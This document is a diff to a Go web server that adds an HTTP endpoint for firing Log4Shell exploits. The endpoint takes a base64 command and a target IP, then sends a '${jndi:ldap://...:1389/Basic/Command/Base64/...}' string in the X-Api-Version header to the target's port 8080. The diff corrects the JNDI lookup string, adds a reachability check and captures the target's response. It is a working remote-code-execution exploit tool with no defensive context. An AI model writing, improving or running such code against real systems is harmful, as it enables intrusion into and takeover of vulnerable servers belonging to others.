@@ -2,6 +2,7 @@ package main
 
 import (
 	"encoding/base64"
+	"errors"
 	"fmt"
 	"io"
 	"net"
@@ -137,6 +138,32 @@ func main() {
 			"output": out,
 		})
 	})
+	// router.GET("/sendpayload", func(c *gin.Context) {
+	// 	payload := c.Query("payload")
+	// 	targetip := c.Query("targetip")
+	// 	if payload == "" {
+	// 		c.JSON(400, gin.H{
+	// 			"error": "Payload is required",
+	// 		})
+	// 		return
+	// 	}
+	// 	if targetip == "" {
+	// 		c.JSON(400, gin.H{
+	// 			"error": "Target IP is required",
+	// 		})
+	// 		return
+	// 	}
+	// 	out, err := SendPayload(payload, targetip)
+	// 	if err != nil {
+	// 		c.JSON(500, gin.H{
+	// 			"error": err.Error(),
+	// 		})
+	// 		return
+	// 	}
+	// 	c.JSON(200, gin.H{
+	// 		"message": out,
+	// 	})
+	// })
 	router.GET("/sendpayload", func(c *gin.Context) {
 		payload := c.Query("payload")
 		targetip := c.Query("targetip")
@@ -145,53 +172,70 @@ func main() {
 				"error": "Payload is required",
 			})
 			return
+		} else {
+			out, err := SendPayload(payload, targetip)
+			if err != nil {
+				c.JSON(500, gin.H{
+					"error": err.Error(),
+				})
+				return
+			} else {
+				c.JSON(200, gin.H{
+					"message": out,
+				})
+			}
 		}
-		if targetip == "" {
-			c.JSON(400, gin.H{
-				"error": "Target IP is required",
-			})
-			return
-		}
-		out, err := SendPayload(payload, targetip)
-		if err != nil {
-			c.JSON(500, gin.H{
-				"error": err.Error(),
-			})
-			return
-		}
-		c.JSON(200, gin.H{
-			"message": out,
-		})
 	})
 	router.Run(":8000")
 }
 
 // -------------------------- Start of Payload Sender -------------------------- //
 func SendPayload(payload string, targetip string) (string, error) {
+	// Decode the payload
 	decodedPayload, err := base64.StdEncoding.DecodeString(payload)
 	if err != nil {
 		return "", err
 	}
+	// Get the internal IP address
 	intIP, err := GetIntIP()
 	if err != nil {
 		return "", err
 	}
+	// Prepare the target address
 	target := targetip + ":8080"
-	reqPayload := "${jdni:ldap://" + intIP.String() + ":1389/Basic/Command/Base64/" + payload + "}"
-	req, err := http.NewRequest("GET", "http://"+target+"/", nil)
-	req.Header.Add("X-Api-Version", reqPayload)
+	// Test if the target is reachable
+	testReq, err := http.NewRequest("GET", "http://"+target+"/", nil)
 	if err != nil {
 		return "", err
 	}
 	client := &http.Client{
 		Timeout: 5 * time.Second,
 	}
+	testResp, err := client.Do(testReq)
+	if err != nil || testResp.StatusCode != http.StatusOK {
+		return "", errors.New("target is not reachable")
+	}
+	defer testResp.Body.Close()
+	// Create the request payload
+	reqPayload := "${jndi:ldap://" + intIP.String() + ":1389/Basic/Command/Base64/" + payload + "}"
+	req, err := http.NewRequest("GET", "http://"+target+"/", nil)
+	if err != nil {
+		return "", err
+	}
+	req.Header.Add("X-Api-Version", reqPayload)
+	// Send the request
 	resp, err := client.Do(req)
 	if err != nil {
 		return "", err
 	}
 	defer resp.Body.Close()
-	return "Payload sent to " + target + " with Decoded-Payload: " + string(decodedPayload) + " and Request-Payload: " + reqPayload, nil
+	// Read the response payload
+	respPayload, err := io.ReadAll(resp.Body)
+	if err != nil {
+		return "", err
+	}
+	// Return the formatted result
+	return "Payload sent to " + target + " with Decoded-Payload: " + string(decodedPayload) + " and Request-Payload: " + reqPayload + " and Response-Payload: " + string(respPayload), nil
 }
 
 // -------------------------- End of Payload Sender -------------------------- //
